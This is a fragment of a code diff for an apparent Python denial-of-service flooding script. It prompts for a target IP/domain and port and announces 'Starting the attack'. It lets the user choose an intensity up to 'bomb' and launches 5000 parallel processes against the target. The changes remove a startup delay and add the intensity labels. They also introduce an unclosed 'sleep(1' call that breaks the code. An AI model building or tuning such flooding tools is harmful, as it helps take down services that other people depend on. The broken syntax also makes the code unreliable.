@@ -74,12 +74,12 @@ ip = input("IP/Domain: ")
 port = int(input("Port: "))
 url = f"http://{str(ip)}"
 print("[>>>] Starting the attack [<<<]")
-sleep(1)
+sleep(0)
 
 def multiplication():
 	global multiple
 	try:
-		multiple = int(input("Insert a number of multiplication"))
+		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
 	except ValueError:
 		print("You mistyped, try again.\n")
 		multiplication()
@@ -102,7 +102,9 @@ def loop():
 	global connection
 	global go
 	global x
+	sleep(1
 
+	
 def send2attack():
   for i in range(5000): #Magic Power
     mp = multiprocessing.Process(target=attack)
